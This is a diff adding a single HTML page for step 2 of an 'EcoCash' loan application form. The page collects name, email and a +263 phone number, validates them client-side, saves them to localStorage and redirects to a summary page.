@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Loan Application</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .logo-eco {
+            color: #0066ff;
+        }
+        
+        .logo-cash {
+            color: #ff0000;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            flex: 1;
+            margin-bottom: 10px;
+        }
+        
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: linear-gradient(to right, #4361ee, #7209b7);
+        }
+        
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .name-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 24px;
+        }
+        
+        .name-group>div {
+            flex: 1;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: #4361ee;
+            outline: none;
+        }
+        
+        .invalid {
+            border-color: #e74c3c !important;
+        }
+        
+        .phone-group {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 0 16px;
+            margin-bottom: 10px;
+            transition: border 0.3s;
+        }
+        
+        .phone-group.invalid {
+            border-color: #e74c3c !important;
+        }
+        
+        .phone-prefix {
+            color: #666;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 16px 0;
+            font-size: 16px;
+        }
+        
+        .phone-input:focus~.phone-group {
+            border-color: #4361ee;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 40px;
+        }
+        
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .prev-btn {
+            background: #eee;
+            color: #666;
+        }
+        
+        .next-btn {
+            background: linear-gradient(to right, #4361ee, #7209b7);
+            color: white;
+        }
+        
+        footer {
+            padding: 20px;
+            color: #aaa;
+            font-size: 13px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div></div>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">Loan Application</h1>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Step 2 of 3</div>
+
+        <div class="name-group">
+            <div>
+                <label class="form-label">First Name</label>
+                <input type="text" class="form-input" id="firstName" placeholder="John">
+            </div>
+            <div>
+                <label class="form-label">Last Name</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+            </div>
+        </div>
+
+        <label class="form-label">Email Address</label>
+        <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:24px;">
+
+        <label class="form-label">Phone Number</label>
+        <div class="phone-group" id="phoneGroup">
+            <span class="phone-prefix">+263</span>
+            <input type="tel" class="phone-input" id="phone" placeholder="771234567">
+        </div>
+        <small style="color:#999; display:block; margin-bottom:30px;">Enter 9 digits (e.g. 771234567)</small>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
+    </main>
+
+    <footer>© 2025 EcoCash</footer>
+
+    <script>
+        // Pre-fill if user goes back
+        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
+        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
+        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
+        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
+
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            // Reset invalid styles
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
+
+            let valid = true;
+
+            if (!firstName) {
+                document.getElementById('firstName').classList.add('invalid');
+                valid = false;
+            }
+            if (!lastName) {
+                document.getElementById('lastName').classList.add('invalid');
+                valid = false;
+            }
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                document.getElementById('email').classList.add('invalid');
+                valid = false;
+            }
+            if (!phone || phone.length !== 9 || !/^\d+$/.test(phone)) {
+                document.getElementById('phoneGroup').classList.add('invalid');
+                valid = false;
+            }
+
+            if (!valid) {
+                alert('Please complete all fields correctly.\n• Email must be valid\n• Phone must be exactly 9 digits');
+                return;
+            }
+
+            // Save to localStorage
+            localStorage.setItem('firstName', firstName);
+            localStorage.setItem('lastName', lastName);
+            localStorage.setItem('email', email);
+            localStorage.setItem('phone', phone);
+
+            // Go to summary (clean URL)
+            window.location.href = 'summary.html';
+        });
+    </script>
+</body>
+
+</html>
